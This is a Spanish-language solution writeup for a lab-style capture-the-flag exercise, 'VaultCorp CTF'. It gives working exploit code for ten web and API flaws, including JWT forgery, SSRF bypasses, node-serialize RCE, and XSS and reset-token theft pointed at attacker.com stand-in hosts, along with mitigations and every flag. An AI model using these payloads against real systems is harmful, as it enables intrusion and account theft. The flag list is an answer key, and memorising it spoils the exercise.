# VaultCorp CTF - Writeup Oficial

## Soluciones para los 10 Flags

> **ADVERTENCIA**: Este documento contiene spoilers. Solo úsalo después de intentar resolver los retos.

---

## FLAG 1: JWT Algorithm Confusion Attack

**Flag:** `VAULT{jwt_4lg0_c0nfus10n_4tt4ck}`

**Categoría:** JWT Security

**Dificultad:** Media-Alta

### Vulnerabilidad

La implementación JWT acepta múltiples algoritmos y es vulnerable a "Algorithm Confusion Attack". Cuando el servidor está configurado para RS256 pero acepta HS256, un atacante puede usar la clave pública (que es pública) como secreto HMAC.

### Explotación

1. Obtener la clave pública del servidor (a veces expuesta en `/api/v1/docs` o `.well-known/jwks.json`)

2. Crear un token JWT con algoritmo HS256 firmado con la clave pública:

```python
import jwt
import requests

# Obtener clave pública
public_key = open('public.pem').read()

# Crear payload de admin
payload = {
    "id": "a0000000-0000-0000-0000-000000000001",
    "email": "admin@vaultcorp.local",
    "role": "admin"
}

# Firmar con HS256 usando la clave pública como secreto
token = jwt.encode(payload, public_key, algorithm='HS256')

# Usar el token
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://localhost:8080/api/v1/admin/config", headers=headers)
print(response.json())
```

3. También funciona con `alg: none`:

```python
# Token con algoritmo "none"
import base64
import json

header = base64.b64encode(json.dumps({"alg": "none", "typ": "JWT"}).encode()).decode().rstrip('=')
payload = base64.b64encode(json.dumps({"id": "admin", "role": "admin"}).encode()).decode().rstrip('=')
token = f"{header}.{payload}."

# Usar el token
```

### Mitigación

- Especificar algoritmos permitidos explícitamente
- Nunca aceptar el algoritmo "none"
- Usar librerías actualizadas con protección contra algorithm confusion

---

## FLAG 2: IDOR (Insecure Direct Object Reference)

**Flag:** `VAULT{1d0r_br0k3n_4cc3ss_c0ntr0l}`

**Categoría:** Broken Access Control

**Dificultad:** Media-Alta

### Vulnerabilidad

El endpoint `/api/v1/accounts/:id` no verifica que el usuario autenticado sea el propietario de la cuenta.

### Explotación

1. Registrar un usuario normal
2. Enumerar IDs de cuentas (el admin tiene un ID conocido o predecible)
3. Acceder a la cuenta del admin:

```bash
# Obtener token normal
TOKEN=$(curl -s -X POST http://localhost:8080/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"testuser@vaultcorp.local","password":"TestPass123!"}' \
  | jq -r '.token')

# Acceder a cuenta del admin (el ID está en init.sql)
curl -s http://localhost:8080/api/v1/accounts/b0000000-0000-0000-0000-000000000001 \
  -H "Authorization: Bearer $TOKEN" | jq
```

### Mitigación

- Siempre verificar ownership antes de retornar datos
- Usar UUIDs no predecibles
- Implementar políticas de acceso a nivel de base de datos

---

## FLAG 3: Race Condition (Double Spend)

**Flag:** `VAULT{r4c3_c0nd1t10n_d0ubl3_sp3nd}`

**Categoría:** Race Condition

**Dificultad:** Alta

### Vulnerabilidad

El endpoint `/api/v1/transactions/claim-bonus` tiene una ventana de tiempo entre la verificación del claim y la actualización del estado.

### Explotación

```python
import requests
import threading
import time

URL = "http://localhost:8080/api/v1/transactions/claim-bonus"
TOKEN = "your_jwt_token"
HEADERS = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}

results = []

def claim_bonus():
    response = requests.post(URL, headers=HEADERS)
    results.append(response.json())

# Lanzar 20 requests concurrentes
threads = []
for i in range(20):
    t = threading.Thread(target=claim_bonus)
    threads.append(t)

# Iniciar todos al mismo tiempo
for t in threads:
    t.start()

for t in threads:
    t.join()

# Verificar resultados
successful = [r for r in results if 'exploit' in r and r['exploit']]
print(f"Bonus reclamado {len(successful)} veces")
```

### Herramienta alternativa: Turbo Intruder (Burp Suite)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)

    for i in range(30):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

### Mitigación

- Usar locks de base de datos (SELECT FOR UPDATE)
- Implementar idempotency keys
- Usar transacciones atómicas

---

## FLAG 4: SSRF (Server-Side Request Forgery)

**Flag:** `VAULT{ssrf_1nt3rn4l_s3rv1c3_4cc3ss}`

**Categoría:** SSRF

**Dificultad:** Alta

### Vulnerabilidad

El endpoint `/api/v1/reports/export?template_url=` permite hacer requests a URLs arbitrarias, incluyendo servicios internos.

### Explotación

```bash
# Acceder al servicio interno
curl "http://localhost:8080/api/v1/reports/export?template_url=http://internal-api:3001/flag" \
  -H "Authorization: Bearer $TOKEN"

# Otros endpoints internos
curl "http://localhost:8080/api/v1/reports/export?template_url=http://internal-api:3001/admin/secrets" \
  -H "Authorization: Bearer $TOKEN"

# Metadata service (simulado)
curl "http://localhost:8080/api/v1/reports/export?template_url=http://internal-api:3001/metadata" \
  -H "Authorization: Bearer $TOKEN"
```

### Bypass de blacklist

```bash
# Usar IP decimal
curl "...?template_url=http://2130706433:3001/flag"  # 127.0.0.1 en decimal

# Usar IPv6
curl "...?template_url=http://[::1]:3001/flag"

# DNS rebinding
curl "...?template_url=http://localtest.me:3001/flag"
```

### Mitigación

- Usar whitelist de dominios permitidos
- Validar respuestas antes de retornarlas
- Bloquear rangos de IP privados

---

## FLAG 5: Cache Poisoning

**Flag:** `VAULT{c4ch3_p01s0n1ng_x55_ch41n}`

**Categoría:** Cache Poisoning

**Dificultad:** Muy Alta

### Vulnerabilidad

La cache key incluye el header `X-Forwarded-Host`, permitiendo envenenar la cache con contenido malicioso.

### Explotación

```bash
# Paso 1: Envenenar la cache
curl "http://localhost:8080/api/v1/admin/dashboard" \
  -H "X-Forwarded-Host: evil.attacker.com" \
  -H "Authorization: Bearer $ADMIN_TOKEN"

# Paso 2: Verificar que la cache fue envenenada
curl "http://localhost:8080/api/v1/admin/dashboard" \
  -H "Authorization: Bearer $ADMIN_TOKEN"

# La respuesta contendrá URLs apuntando a evil.attacker.com
```

### Chain con XSS

```html
<!-- Si el atacante controla evil.attacker.com -->
<!-- El script inyectado en la respuesta cacheada ejecutaría: -->
<script src="https://evil.attacker.com/js/admin.js"></script>
<!-- Que podría robar cookies/tokens de otros usuarios -->
```

### Mitigación

- No incluir headers controlados por usuario en cache keys
- Validar estrictamente el header Host
- Usar Vary headers correctamente

---

## FLAG 6: Prototype Pollution

**Flag:** `VAULT{pr0t0typ3_p0llut10n_rce}`

**Categoría:** Prototype Pollution

**Dificultad:** Muy Alta

### Vulnerabilidad

El endpoint `/api/v1/users/preferences` usa una función merge vulnerable que permite modificar `Object.prototype`.

### Explotación

```bash
# Payload de prototype pollution
curl -X POST "http://localhost:8080/api/v1/users/preferences" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "__proto__": {
      "polluted": true,
      "isAdmin": true,
      "flag": "captured"
    }
  }'

# Alternativa con constructor
curl -X POST "http://localhost:8080/api/v1/users/preferences" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "constructor": {
      "prototype": {
        "polluted": true
      }
    }
  }'
```

### Mitigación

- Usar Object.create(null) para objetos sin prototype
- Filtrar keys como `__proto__`, `constructor`, `prototype`
- Usar librerías seguras de merge

---

## FLAG 7: Timing Attack

**Flag:** `VAULT{t1m1ng_4tt4ck_p4ssw0rd_l34k}`

**Categoría:** Side Channel Attack

**Dificultad:** Alta

### Vulnerabilidad

El login tiene diferencias de tiempo medibles entre usuarios existentes y no existentes, y la verificación de contraseña tiene delays proporcionales.

### Explotación: Enumeración de usuarios

```python
import requests
import time
import statistics

def measure_login_time(email, password="wrongpass"):
    times = []
    for _ in range(10):
        start = time.time()
        requests.post("http://localhost:8080/api/v1/auth/login",
                     json={"email": email, "password": password})
        times.append(time.time() - start)
    return statistics.mean(times)

# Usuario existente vs no existente
existing = measure_login_time("admin@vaultcorp.local")
non_existing = measure_login_time("nonexistent@test.com")

print(f"Existing user: {existing:.4f}s")
print(f"Non-existing: {non_existing:.4f}s")
# El usuario existente toma más tiempo debido al bcrypt
```

### Mitigación

- Usar comparaciones de tiempo constante
- Añadir delay aleatorio
- Siempre ejecutar bcrypt incluso si el usuario no existe

---

## FLAG 8: Mass Assignment

**Flag:** `VAULT{m4ss_4ss1gnm3nt_pr1v_3sc}`

**Categoría:** Mass Assignment

**Dificultad:** Media-Alta

### Vulnerabilidad

El endpoint PUT `/api/v1/users/me` acepta cualquier campo, incluyendo `role`.

### Explotación

```bash
# Actualizar el rol a admin
curl -X PUT "http://localhost:8080/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# Verificar la escalación
curl "http://localhost:8080/api/v1/users/me" \
  -H "Authorization: Bearer $TOKEN"
```

### Mitigación

- Usar whitelist de campos permitidos
- Nunca confiar en input del usuario para campos sensibles
- Implementar DTOs (Data Transfer Objects)

---

## FLAG 9: OAuth/Open Redirect

**Flag:** `VAULT{04uth_r3d1r3ct_t0k3n_l34k}`

**Categoría:** OAuth Vulnerabilities

**Dificultad:** Alta

### Vulnerabilidad

Los endpoints de OAuth y password reset aceptan `redirect_uri`/`callback_url` sin validación.

### Explotación

```bash
# Password reset con callback malicioso
curl -X POST "http://localhost:8080/api/v1/auth/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{
    "email": "admin@vaultcorp.local",
    "callback_url": "https://attacker.com/capture"
  }'

# OAuth callback con redirect malicioso
curl "http://localhost:8080/api/v1/auth/oauth/callback?code=test&redirect_uri=https://attacker.com/steal"
```

### Mitigación

- Validar redirect_uri contra whitelist
- Usar solo redirects relativos
- Implementar state parameter

---

## FLAG 10: Insecure Deserialization

**Flag:** `VAULT{1ns3cur3_d3s3r14l1z4t10n}`

**Categoría:** Insecure Deserialization

**Dificultad:** Experto

### Vulnerabilidad

El endpoint `/api/v1/webhooks/process` usa `node-serialize` que es vulnerable a RCE mediante IIFE (Immediately Invoked Function Expression).

### Explotación

```bash
# Payload de node-serialize RCE
curl -X POST "http://localhost:8080/api/v1/webhooks/process" \
  -H "Content-Type: application/json" \
  -d '{
    "format": "serialized",
    "data": "{\"rce\":\"_$$ND_FUNC$$_function(){return '"'"'pwned'"'"'}()\"}"
  }'

# Payload más complejo
PAYLOAD='{"exploit":"_$$ND_FUNC$$_function(){return process.env.FLAG_10 || \"flag\"}()"}'
curl -X POST "http://localhost:8080/api/v1/webhooks/process" \
  -H "Content-Type: application/json" \
  -d "{\"format\": \"serialized\", \"data\": \"$PAYLOAD\"}"
```

### Generador de payload

```javascript
const serialize = require('node-serialize');

const payload = {
  rce: function() {
    return require('child_process').execSync('id').toString();
  }
};

// Serializar y añadir IIFE
let serialized = serialize.serialize(payload);
serialized = serialized.replace('"}', '()"}');

console.log(serialized);
```

### Mitigación

- NUNCA usar node-serialize
- Usar JSON.parse/JSON.stringify
- Implementar input validation estricta

---

## Resumen de Flags

| # | Flag | Técnica |
|---|------|---------|
| 1 | `VAULT{jwt_4lg0_c0nfus10n_4tt4ck}` | JWT Algorithm Confusion |
| 2 | `VAULT{1d0r_br0k3n_4cc3ss_c0ntr0l}` | IDOR |
| 3 | `VAULT{r4c3_c0nd1t10n_d0ubl3_sp3nd}` | Race Condition |
| 4 | `VAULT{ssrf_1nt3rn4l_s3rv1c3_4cc3ss}` | SSRF |
| 5 | `VAULT{c4ch3_p01s0n1ng_x55_ch41n}` | Cache Poisoning |
| 6 | `VAULT{pr0t0typ3_p0llut10n_rce}` | Prototype Pollution |
| 7 | `VAULT{t1m1ng_4tt4ck_p4ssw0rd_l34k}` | Timing Attack |
| 8 | `VAULT{m4ss_4ss1gnm3nt_pr1v_3sc}` | Mass Assignment |
| 9 | `VAULT{04uth_r3d1r3ct_t0k3n_l34k}` | OAuth Open Redirect |
| 10 | `VAULT{1ns3cur3_d3s3r14l1z4t10n}` | Insecure Deserialization |

---

## Recursos de Aprendizaje

- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

*VaultCorp CTF - Diseñado para profesionales de seguridad*
